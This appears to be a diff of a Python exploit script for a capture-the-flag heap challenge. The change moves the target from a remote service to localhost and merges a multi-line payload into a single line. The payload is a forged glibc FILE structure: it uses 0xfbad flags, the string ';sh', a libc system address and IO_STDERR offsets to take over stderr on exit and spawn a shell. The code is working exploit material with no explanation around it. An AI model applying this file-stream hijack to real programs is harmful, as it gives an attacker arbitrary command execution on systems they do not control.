@@ -186,7 +186,7 @@ if REMOTE_LOCAL=="y":
     debug_init()
     
 else:                                           
-    REMOTE_INFO=split_nc("nc naup.com 2000")
+    REMOTE_INFO=split_nc("nc 127.0.0.1 51001")
 
     REMOTE_IP=REMOTE_INFO[0]
     REMOTE_PORT=int(REMOTE_INFO[1])
@@ -250,16 +250,10 @@ add(b'Tomorin')
 add(b'Soyorin')
 add(b'Rana')
 
-payload2 =  p32(0xfbad0101) + b";sh\x00" + b'\x00' * (0x50)
-payload2 += p64(libc_system) + b'\x00' * (0x28)
-payload2 += p64(IO_STDERR - 0x10) + b'\x00' * (0x10)
-payload2 += p64(IO_STDERR - 0x10) + b'\x00' * 0x18
-payload2 += p32(1) + b'\x00' * (0xc)
-payload2 += p64(IO_STDERR - 0x10) + p64(libcbase + 0x217078) 
+payload2 =  p32(0xfbad0101) + b";sh\x00" + b'\x00' * (0x50) + p64(libc_system) + b'\x00' * (0x28) + p64(IO_STDERR - 0x10) + b'\x00' * (0x10) + p64(IO_STDERR - 0x10) + b'\x00' * 0x18 + p32(1) + b'\x00' * (0xc) + p64(IO_STDERR - 0x10) + p64(libcbase + 0x217078) 
 
 edit(3, payload2)
 exitf()
-
 
 NAUPINFO("LEAKLIBC", hex(leaklibc))
 NAUPINFO("LIBCBASE", hex(libcbase))
